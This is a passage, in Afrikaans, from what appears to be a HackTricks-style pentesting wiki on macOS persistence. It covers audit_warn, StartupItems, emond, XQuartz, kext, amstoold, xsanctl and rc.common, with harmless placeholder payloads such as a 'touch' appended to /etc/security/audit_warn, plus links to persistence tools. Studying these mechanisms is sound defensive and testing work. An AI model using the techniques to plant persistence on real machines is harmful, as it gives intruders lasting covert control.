- **Trigger**: Wanneer auditd 'n waarskuwing bespeur

#### Beskrywing & Exploit

Wanneer auditd 'n waarskuwing bespeur, word die script **`/etc/security/audit_warn`** **uitgevoer**. Dus kan jy jou payload daaraan voeg.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Jy kan 'n waarskuwing afdwing met `sudo audit -n`.

### Opstartitems

> [!CAUTION] > **Dit is verouderd, dus behoort niks in daardie gidse gevind te word nie.**

Die **StartupItem** is 'n gids wat in ofwel `/Library/StartupItems/` of `/System/Library/StartupItems/` geplaas behoort te word. Sodra hierdie gids bestaan, moet dit twee spesifieke lêers bevat:

1. 'n **rc script**: 'n shell-skrip wat by opstart uitgevoer word.
2. 'n **plist file**, spesifiek genaamd `StartupParameters.plist`, wat verskeie konfigurasie-instellings bevat.

Maak seker dat beide die rc script en die `StartupParameters.plist` lêer korrek in die **StartupItem**-gids geplaas is sodat die opstartproses dit kan herken en gebruik.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ek kan hierdie komponent nie in my macOS vind nie, so vir meer inligting, kyk die writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Ingevoer deur Apple, **emond** is 'n logmeganisme wat na alle waarskynlikheid onderontwikkel of moontlik opgegee is, maar tog steeds toeganklik bly. Alhoewel dit nie besonder nuttig vir 'n Mac-administrateur is nie, kan hierdie onduidelike diens as 'n subtiele persistensmetode vir bedreigingsakteurs dien, waarskynlik onopgemerk deur die meeste macOS-administrateurs.

Vir dié wat van die bestaan daarvan bewus is, is dit eenvoudig om enige kwaadwillige gebruik van **emond** te identifiseer. Die stelsel se LaunchDaemon vir hierdie diens soek skripte om in 'n enkele gids uit te voer. Om dit na te gaan, kan die volgende opdrag gebruik word:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Ligging

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- **Vereis root**
- **Trigger**: Met XQuartz

#### Beskrywing & Exploit

XQuartz is **nie meer in macOS geïnstalleer nie**, dus as jy meer inligting wil hê, sien die writeup.

### ~~kext~~

> [!CAUTION]
> Dit is so ingewikkeld om kext te installeer, selfs as root, dat ek dit nie sal oorweeg as 'n manier om uit sandboxes te ontsnap of selfs vir persistence te gebruik nie (tensy jy 'n exploit het)

#### Ligging

Om 'n KEXT as 'n startup item te installeer, moet dit **in een van die volgende liggings geïnstalleer wees**:

- `/System/Library/Extensions`
- KEXT files built into the OS X operating system.
- `/Library/Extensions`
- KEXT files installed by 3rd party software

Jy kan tans gelaaide kext-lêers lys met:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Vir meer inligting oor [**kernuitbreidings, kyk hierdie afdeling**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Location

- **`/usr/local/bin/amstoold`**
- Root benodig

#### Description & Exploitation

Skynbaar het die `plist` van `/System/Library/LaunchAgents/com.apple.amstoold.plist` hierdie binary gebruik terwyl dit 'n XPC service blootgestel het... die ding is dat die binary nie bestaan het nie, so jy kon iets daar plaas en wanneer die XPC service aangeroep word sal jou binary aangeroep word.

Ek kan dit nie meer op my macOS vind nie.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Location

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root benodig
- **Trigger**: Wanneer die diens uitgevoer word (selde)

#### Description & exploit

Skynbaar is dit nie baie algemeen dat hierdie script uitgevoer word nie en ek kon dit nie eers op my macOS vind nie, so as jy meer inligting wil hê, kyk na die writeup.

### ~~/etc/rc.common~~

> [!CAUTION] > **Dit werk nie in moderne MacOS weergawes nie**

Dit is ook moontlik om hier **opdragte te plaas wat by opstart uitgevoer sal word.** Voorbeeld van 'n gewone rc.common script:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistensie tegnieke en gereedskap

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## Verwysings

- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
